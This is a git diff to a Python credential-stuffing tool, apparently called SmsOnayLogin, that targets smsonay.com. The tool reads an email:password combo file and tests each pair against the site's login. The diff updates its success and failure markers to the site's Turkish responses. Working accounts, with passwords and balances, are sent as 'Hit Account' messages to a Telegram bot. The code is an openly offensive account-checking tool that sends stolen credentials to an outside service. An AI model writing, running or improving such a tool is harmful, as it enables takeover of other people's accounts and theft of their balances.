@@ -21,7 +21,7 @@ def print_banner(title):
     print(pyfiglet.figlet_format(title, font='smslant') + f"{GREEN}                       Github: SPARUX-666 </>\n")
     print(f"{GREEN}{'━'*67}{RESET}")
 
-print_banner('SmsOnayLogin')
+print_banner('SmsOnayLogin+')
 
 def read_credentials_from_file(file_name):
     try:
@@ -34,7 +34,7 @@ def read_credentials_from_file(file_name):
                     credentials.append(parts)
                 else:
                     print(RED + f"❌ Invalid Format: {line.strip()} - Expected format email:password")
-            return credentials
+        return credentials
     except FileNotFoundError:
         print(RED + "❌ File not found!")
         return []
@@ -135,13 +135,13 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
     ]
 
     failed_conditions = [
-        "Login Failed!\",\"message\":\"Please check your email and password and try again.",
+        "Giri\\u015f Ba\\u015far\\u0131s\\u0131z!\",\"message\":\"L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin.",
         "{\"success\":false,\"",
-        "Please check your email and password and try again."
+        "L\\u00fctfen email ve parolay\\u0131 kontrol edip tekrar deneyin."
     ]
     success_conditions = [
-        "Login Successful!",
-        "You have successfully logged in."
+        "Giri\\u015f Ba\\u015far\\u0131l\\u0131!",
+        "Ba\\u015far\\u0131yla giri\\u015f yapt\\u0131n\\u0131z."
     ]
 
     for email, password in credentials:
@@ -165,10 +165,10 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
 
 def main():
     bot_token = input(f"{BLUE}Enter Bot Token: {GREY}")
-    chat_id = input(f"{BLUE}Enter ID: {GREY}")
+    chat_id = input(f"{BLUE}Enter Telegram ID: {GREY}")
     success_message = "smsonay.com\nHit Account\nEmail: {email}\nPassword: {password}\nBalance: {balance}\nGithub: Github.com/Sparux-666"
 
-    file_name = input(f"{BLUE}Combo Path: {GREY}")
+    file_name = input(f"{BLUE}Enter Combo File Path: {GREY}")
     scan_accounts(file_name, bot_token, chat_id, success_message)
 
 main()
